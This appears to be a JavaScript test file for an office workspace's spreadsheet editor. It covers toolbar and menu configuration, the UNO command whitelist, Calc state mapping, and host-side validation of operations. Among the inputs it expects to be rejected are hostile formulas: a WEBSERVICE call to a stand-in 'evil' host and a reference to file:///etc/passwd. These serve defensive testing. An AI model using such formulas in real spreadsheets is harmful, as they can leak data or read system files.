// [excel] Toolbar configuration sanity + Calc state mapping + host-side gating of the new spreadsheet operations.
import {test} from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import {tmpdir} from 'node:os';
import {mkdtemp, rm, copyFile, readFile} from 'node:fs/promises';
import {TOOLBAR, SEP, SHAPE_COMMANDS, NUMBER_FORMATS, FUNCTION_GROUPS, allSheetItems, mapSheetStates, menuContext, numberFormatLabel, MAIN_MENU, MORE_MENU} from '../src/office/sheet/sheet-config.js';
import {UNO_COMMANDS, LEGACY_COMMANDS, validateUno} from '../src/shared/office-uno.js';
import {formulaAllowed} from '../src/shared/office-sheet.js';
import {Store} from '../core.mjs';
import {generateDocument} from '../runtime/documents.mjs';
import {createDocumentService} from '../services/documents.mjs';
import {createOfficeWorkspace} from '../services/office-workspace.mjs';

test('every toolbar/menu UNO command is whitelisted for xlsx with valid arguments', () => {
  const items = allSheetItems();
  assert.ok(items.length > 80, 'toolbar exposes the full Tencent-style feature set: ' + items.length);
  for (const item of items) {
    const command = item.do?.uno;
    if (!command) continue;
    if (LEGACY_COMMANDS.includes(command)) continue;
    assert.ok(Object.hasOwn(UNO_COMMANDS, command), 'not whitelisted: ' + command);
    assert.doesNotThrow(() => validateUno(command, item.do.args, {format: 'xlsx'}), command);
  }
  for (const f of NUMBER_FORMATS) if (f !== SEP && f.command) assert.doesNotThrow(() => validateUno(f.command, null, {format: 'xlsx'}), f.command);
  for (const c of SHAPE_COMMANDS) { assert.doesNotThrow(() => validateUno(c, null, {format: 'xlsx'}), c); assert.doesNotThrow(() => validateUno(c, null, {format: 'pptx'}), c); }
  for (const [, , names] of FUNCTION_GROUPS) for (const n of names) assert.ok(formulaAllowed('=' + n + '(A1)'), n);
  assert.doesNotThrow(() => validateUno('.uno:BackgroundColor', {BackgroundColor: -1}, {format: 'xlsx'}));
  assert.doesNotThrow(() => validateUno('.uno:Color', {Color: 0xFF0000}, {format: 'xlsx'}));
  assert.throws(() => validateUno('.uno:InsertCell', {Flags: 'X'}, {format: 'xlsx'}));
  assert.throws(() => validateUno('.uno:WrapText', null, {format: 'pptx'}), /文档类型/);
  assert.throws(() => validateUno('.uno:DataPilotExec', null, {format: 'xlsx'}));
});
test('toolbar order follows the reference screenshots', () => {
  const order = TOOLBAR.filter(i => i !== SEP).map(i => i.id);
  const expected = ['menu', 'undo', 'redo', 'painter', 'clear-format', 'insert', 'font-name', 'font-size', 'bold', 'font-color', 'fill', 'border', 'cells', 'rowcol', 'halign', 'valign', 'rotate', 'wrap', 'merge', 'numfmt', 'percent', 'thousands', 'dec-inc', 'dec-dec', 'filter', 'freeze', 'more'];
  assert.deepEqual(order, expected);
  const labels = MAIN_MENU(menuContext()).map(i => i.label);
  assert.deepEqual(labels, ['插入', '数据', '公式', '视图']);
  const formula = MAIN_MENU(menuContext())[2].menu.map(i => i === SEP ? '-' : i.label);
  for (const l of ['常用函数', '财务', '日期与时间', '数学与三角函数', '统计', '查找与引用', '文本', '逻辑', '信息', '工程', '数据库', '兼容性', '特色函数', '名称管理', '快速创建', '计算选项']) assert.ok(formula.includes(l), l);
  const more = MORE_MENU(menuContext({col: 0, row: 0})).filter(i => i !== SEP).map(i => i.label || i.id);
  assert.ok(more.includes('将 [A – A] 列分为一组') && more.includes('将 [1 – 1] 行分为一组'), more.join());
});
test('Calc states map to toolbar state', () => {
  const s = mapSheetStates({'.uno:Bold': 'true', '.uno:AlignHorizontalCenter': 'true', '.uno:AlignMiddle': 'true', '.uno:WrapText': 'true', '.uno:NumberFormatPercent': 'true', '.uno:ToggleMergeCells': 'true', '.uno:DataFilterAutoFilter': 'false', '.uno:FreezePanes': 'true', '.uno:FontHeight': '10.5', '.uno:CharFontName': 'Calibri'});
  assert.equal(s.bold, true); assert.equal(s.italic, false); assert.equal(s.halign, 'center'); assert.equal(s.valign, 'middle'); assert.equal(s.wrap, true);
  assert.equal(s.numfmt, 'percent'); assert.equal(s.percent, true); assert.equal(s.merge, true); assert.equal(s.filter, false); assert.equal(s.frozen, true);
  assert.equal(s.size, '10.5'); assert.equal(s.font, 'Calibri');
  assert.equal(mapSheetStates(null).halign, 'general'); assert.equal(numberFormatLabel('general'), '常规'); assert.equal(numberFormatLabel('date'), '日期');
  assert.equal(menuContext({col: 1, row: 1}).freezeLabel, '冻结至第2行B列');
});

async function setup(requests, reply = () => ({})) {
  const dir = await mkdtemp(path.join(tmpdir(), 'wb-sheet-')), store = new Store(dir); await store.load();
  const documents = createDocumentService({store});
  const d = (await documents.importFile('Sheet', 'xlsx', (await generateDocument('xlsx', JSON.stringify({sheets: [{name: 'A', rows: [['x', 1]]}, {name: 'B', rows: [['y']]}]}))).bytes)).document;
  const kit = createOfficeWorkspace({documents, directory: path.join(dir, 'kit'), runtime: async () => ({python: 'x', officeDirectory: 'y'}), approve: async () => true,
    driver: async o => ({request: async (op, data) => { requests.push([op, data]); if (op === 'save') await copyFile(path.join(o.directory, 'document.' + o.format), path.join(o.directory, 'edited.' + o.format)); return reply(op, data); }, close() {}})});
  return {dir, kit, d};
}
test('host validates spreadsheet operations and forwards only rebuilt payloads', async () => {
  const rq = [], f = await setup(rq);
  try {
    const id = (await f.kit.open(f.d.id, 1)).sessionId;
    await f.kit.operation(id, 'sheet_key', {key: 'ArrowDown', shift: true, extra: 'ignored'});
    assert.deepEqual(rq.find(r => r[0] === 'sheet_key'), ['sheet_key', {key: 'ArrowDown', shift: true, control: false, alt: false}]);
    await f.kit.operation(id, 'sheet_text', {text: '中文1'});
    await f.kit.operation(id, 'sheet_goto', {ref: 'C1:C1048576'});
    await f.kit.operation(id, 'cell_input', {text: '=SUM(A1:A3)', move: 'down'});
    await f.kit.operation(id, 'sheet_border', {kind: 'outer', color: '#1E88E5', style: 'dashed'});
    await f.kit.operation(id, 'sheet_size', {axis: 'row', index: 4, size: 600});
    await f.kit.operation(id, 'sheet_tab', {action: 'rename', index: 1, name: '第二页', to: 9});
    assert.deepEqual(rq.find(r => r[0] === 'sheet_tab'), ['sheet_tab', {action: 'rename', index: 1, name: '第二页'}]);
    await f.kit.operation(id, 'uno', {command: '.uno:WrapText'});
    await f.kit.operation(id, 'uno', {command: '.uno:InsertCell', args: {Flags: 'V'}});
    assert.deepEqual(rq.filter(r => r[0] === 'uno').map(r => r[1]), [{command: '.uno:WrapText', args: null}, {command: '.uno:InsertCell', args: {Flags: {type: 'string', value: 'V'}}}]);
    const n = rq.length;
    for (const [op, p] of [['sheet_key', {key: 'F12'}], ['sheet_text', {text: ''}], ['sheet_goto', {ref: 'Sheet1!A1'}], ['cell_input', {text: '=WEBSERVICE("http://evil")'}],
      ['cell_input', {text: "='file:///etc/passwd'#$A.A1"}], ['sheet_border', {kind: 'all', color: 'red'}], ['sheet_size', {axis: 'column', index: 0, size: 1}],
      ['sheet_tab', {action: 'rename', index: 0, name: 'a/b'}], ['sheet_tab', {action: 'nuke', index: 0}], ['uno', {command: '.uno:DataPilotExec'}], ['uno', {command: '.uno:InsertCell', args: {Flags: 'R'}}]])
      await assert.rejects(f.kit.operation(id, op, p), op + ' ' + JSON.stringify(p));
    assert.equal(rq.length, n, 'rejected operations never reach the worker');
  } finally { await f.kit.shutdown(); await rm(f.dir, {recursive: true, force: true}); }
});
test('navigation that commits an in-cell edit marks the draft dirty and saves; pure navigation does not', async () => {
  let changed = false;
  const rq = [], f = await setup(rq, op => (['sheet_key', 'mouse', 'sheet_text'].includes(op) ? {changed} : {}));
  try {
    const id = (await f.kit.open(f.d.id, 1)).sessionId;
    const before = rq.filter(r => r[0] === 'save').length;
    await f.kit.operation(id, 'sheet_key', {key: 'ArrowRight'});
    await f.kit.operation(id, 'mouse', {type: 0, x: 10, y: 10});
    assert.equal(rq.filter(r => r[0] === 'save').length, before, 'no save without a change');
    changed = true;
    await f.kit.operation(id, 'sheet_key', {key: 'Enter'});
    assert.equal(rq.filter(r => r[0] === 'save').length, before + 1, 'committed edit is saved');
    await f.kit.operation(id, 'mouse', {type: 0, x: 3000000, y: 250000000});
    await assert.rejects(f.kit.operation(id, 'mouse', {type: 0, x: 10, y: 300000001}));
  } finally { await f.kit.shutdown(); await rm(f.dir, {recursive: true, force: true}); }
});
test('spreadsheet operations are refused for other formats; worker re-validates', async () => {
  const rq = [], dir = await mkdtemp(path.join(tmpdir(), 'wb-sheet-docx-')), store = new Store(dir); await store.load();
  const documents = createDocumentService({store});
  const d = (await documents.importFile('W', 'docx', (await generateDocument('docx', JSON.stringify({blocks: [{type: 'paragraph', text: 'hi'}]}))).bytes)).document;
  const kit = createOfficeWorkspace({documents, directory: path.join(dir, 'kit'), runtime: async () => ({python: 'x', officeDirectory: 'y'}), approve: async () => true, driver: async () => ({request: async (op, data) => { rq.push([op, data]); return {}; }, close() {}})});
  try {
    const id = (await kit.open(d.id, 1)).sessionId;
    await assert.rejects(kit.operation(id, 'cell_input', {text: 'x'}), /表格/);
    await assert.rejects(kit.operation(id, 'mouse', {type: 0, x: 10, y: 2000001}));
    assert.equal(rq.filter(r => r[0].startsWith('sheet')).length, 0);
  } finally { await kit.shutdown(); await rm(dir, {recursive: true, force: true}); }
  const worker = await readFile(new URL('../runtime/office-kit/worker.py', import.meta.url), 'utf8');
  for (const needle of ['def formula_ok', 'def close_dialogs', "elif op=='sheet_key'", "elif op=='cell_input'", "elif op=='sheet_tab'", '.uno:SheetGeometryData', 'WEBSERVICE']) assert.ok(worker.includes(needle), needle);
});
